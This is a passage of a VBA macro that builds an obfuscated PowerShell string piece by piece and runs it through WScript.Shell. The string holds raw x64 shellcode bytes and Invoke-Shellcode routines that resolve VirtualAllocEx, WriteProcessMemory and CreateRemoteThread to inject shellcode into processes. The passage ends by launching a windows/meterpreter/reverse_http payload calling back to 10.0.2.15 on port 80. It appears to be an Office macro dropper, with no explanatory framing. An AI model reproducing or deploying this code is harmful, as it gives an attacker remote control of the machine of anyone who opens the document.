        XmuJYn = XmuJYn + "x8b,0x34,0x88,0x48,
                              "
        XmuJYn = XmuJYn + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        XmuJYn = XmuJYn + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        XmuJYn = XmuJYn + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        XmuJYn = XmuJYn + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        XmuJYn = XmuJYn + "                                  0x8b,0x40,0x24,0"
        XmuJYn = XmuJYn + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        XmuJYn = XmuJYn + "x40,0x1c,0x49,
                                  0"
        XmuJYn = XmuJYn + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        XmuJYn = XmuJYn + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        XmuJYn = XmuJYn + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        XmuJYn = XmuJYn + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        XmuJYn = XmuJYn + "                             0x59,0x5a,0x48,0x8b,0"
        XmuJYn = XmuJYn + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        XmuJYn = XmuJYn + "x00,0x00,
                                  0x00,0"
        XmuJYn = XmuJYn + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        XmuJYn = XmuJYn + "x00,0x41,0xba,0x31,0x8b,
                         "
        XmuJYn = XmuJYn + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        XmuJYn = XmuJYn + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        XmuJYn = XmuJYn + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        XmuJYn = XmuJYn + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        XmuJYn = XmuJYn + "x47,
                                  0x13,0x72,0"
        XmuJYn = XmuJYn + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        XmuJYn = XmuJYn + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        XmuJYn = XmuJYn + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        XmuJYn = XmuJYn + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        XmuJYn = XmuJYn + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        XmuJYn = XmuJYn + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        XmuJYn = XmuJYn + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        XmuJYn = XmuJYn + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        XmuJYn = XmuJYn + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        XmuJYn = XmuJYn + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        XmuJYn = XmuJYn + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        XmuJYn = XmuJYn + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        XmuJYn = XmuJYn + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        XmuJYn = XmuJYn + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        XmuJYn = XmuJYn + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        XmuJYn = XmuJYn + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        XmuJYn = XmuJYn + "ernel32.dll WriteProcessMemory
        $WriteProce"
        XmuJYn = XmuJYn + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        XmuJYn = XmuJYn + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        XmuJYn = XmuJYn + "()) ([Bool])
        $WriteProcessMemory = [System"
        XmuJYn = XmuJYn + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        XmuJYn = XmuJYn + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        XmuJYn = XmuJYn + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        XmuJYn = XmuJYn + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        XmuJYn = XmuJYn + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        XmuJYn = XmuJYn + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        XmuJYn = XmuJYn + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        XmuJYn = XmuJYn + "eateRemoteThread = [System.Runtime.InteropServices"
        XmuJYn = XmuJYn + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        XmuJYn = XmuJYn + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        XmuJYn = XmuJYn + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        XmuJYn = XmuJYn + " CloseHandle
        $CloseHandleDelegate = Get-De"
        XmuJYn = XmuJYn + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        XmuJYn = XmuJYn + "le = [System.Runtime.InteropServices.Marshal]::Get"
        XmuJYn = XmuJYn + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        XmuJYn = XmuJYn + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        XmuJYn = XmuJYn + ".ShouldContinue( 'Do you wish to carry out your ev"
        XmuJYn = XmuJYn + "il plans?',
                 "Injecting shellcode "
        XmuJYn = XmuJYn + "injecting into $((Get-Process -Id $ProcessId).Proc"
        XmuJYn = XmuJYn + "essName) ($ProcessId)!" ) )
        {
            "
        XmuJYn = XmuJYn + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        XmuJYn = XmuJYn + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        XmuJYn = XmuJYn + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        XmuJYn = XmuJYn + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        XmuJYn = XmuJYn + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        XmuJYn = XmuJYn + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        XmuJYn = XmuJYn + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        XmuJYn = XmuJYn + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        XmuJYn = XmuJYn + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        XmuJYn = XmuJYn + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        XmuJYn = XmuJYn + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        XmuJYn = XmuJYn + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        XmuJYn = XmuJYn + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        XmuJYn = XmuJYn + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        XmuJYn = XmuJYn + "rocAddress kernel32.dll CreateThread
        $Crea"
        XmuJYn = XmuJYn + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        XmuJYn = XmuJYn + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        XmuJYn = XmuJYn + "IntPtr])
        $CreateThread = [System.Runtime.I"
        XmuJYn = XmuJYn + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        XmuJYn = XmuJYn + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        XmuJYn = XmuJYn + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        XmuJYn = XmuJYn + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        XmuJYn = XmuJYn + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        XmuJYn = XmuJYn + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        XmuJYn = XmuJYn + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        XmuJYn = XmuJYn + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        XmuJYn = XmuJYn + "ForSingleObjectDelegate)
        if ( $Force -or $"
        XmuJYn = XmuJYn + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        XmuJYn = XmuJYn + " your evil plans?',
                 "Injecting sh"
        XmuJYn = XmuJYn + "ellcode into the running PowerShell process!" ) )
"
        XmuJYn = XmuJYn + "        {
            Inject-LocalShellcode
      "
        XmuJYn = XmuJYn + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        XmuJYn = XmuJYn + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        XmuJYn = XmuJYn + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(XmuJYn)
End Function

